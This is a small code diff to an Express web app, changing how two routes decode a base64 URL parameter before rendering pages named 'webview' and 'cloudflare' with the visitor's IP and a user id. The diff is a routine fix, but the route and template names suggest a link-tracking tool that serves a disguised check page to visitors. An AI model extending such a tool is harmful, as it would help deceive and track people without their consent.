@@ -55,7 +55,7 @@ app.get("/w/:path/:uri", (req, res) => {
         res.render("webview", {
             ip: ip,
             time: d,
-            url: atob(req.params.uri),
+            url: Buffer.from(req.params.uri, 'base64').toString('utf8'),
             uid: req.params.path,
             a: hostURL,
             t: use1pt
@@ -102,7 +102,7 @@ app.get("/c/:path/:uri", (req, res) => {
         res.render("cloudflare", {
             ip: ip,
             time: d,
-            url: atob(req.params.uri),
+            url: Buffer.from(req.params.uri, 'base64').toString('utf8'),
             uid: req.params.path,
             a: hostURL,
             t: use1pt
